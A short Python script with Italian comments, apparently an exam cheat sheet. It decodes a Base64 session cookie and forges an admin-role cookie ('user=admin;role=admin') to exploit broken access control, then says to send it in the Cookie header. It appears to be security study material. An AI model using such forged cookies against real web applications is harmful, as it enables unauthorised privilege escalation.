#!/usr/bin/env python3
"""
PRONTUARIO #05: Web Cookie Tampering & Broken Access Control
------------------------------------------------------------
Modulo: Web Security / Privilege Escalation
Descrizione: Manipolazione e forgiatura di cookie di sessione lato client
            (in chiaro o Base64) per analisi di Broken Access Control.
"""

import base64

# ==================== INPUT DATI D'ESAME ====================
# Cookie originale restituito dal server (rilevato da DevTools)
ORIGINAL_COOKIE = "dXNlcj1ndWVzdDtyb2xlPWd1ZXN0"

# Stringa dei privilegi da forgiare
RAW_PAYLOAD = "user=admin;role=admin"

# Impostare True se il cookie impiega la codifica Base64
USE_BASE64 = True
# ============================================================


def decode_cookie(cookie_val: str, is_b64: bool) -> str:
    """Decodifica il valore del cookie da Base64 o restituisce la stringa in chiaro."""
    if is_b64:
        return base64.b64decode(cookie_val.encode('utf-8')).decode('utf-8', errors='ignore')
    return cookie_val


def encode_cookie(payload: str, is_b64: bool) -> str:
    """Ricodifica il payload in Base64 o restituisce la stringa originale."""
    if is_b64:
        return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    return payload


def main():
    print("=== ANALYSIS & COOKIE TAMPERING TOOL ===")
    print(f"[*] Cookie Originale : {ORIGINAL_COOKIE}")
    
    # 1. Decodifica e analisi dello stato originale
    decoded_orig = decode_cookie(ORIGINAL_COOKIE, USE_BASE64)
    print(f"[*] Decodifica Stato : '{decoded_orig}'")
    
    # 2. Forgiatura del nuovo stato con privilegi elevati
    forged_cookie = encode_cookie(RAW_PAYLOAD, USE_BASE64)
    print(f"\n[+] Payload Forgiato : '{RAW_PAYLOAD}'")
    print(f"[+] Cookie Forgiato  : {forged_cookie}")
    print("\n[*] Utilizzare il cookie forgiato nell'header HTTP 'Cookie:' della richiesta.")


if __name__ == "__main__":
    main()
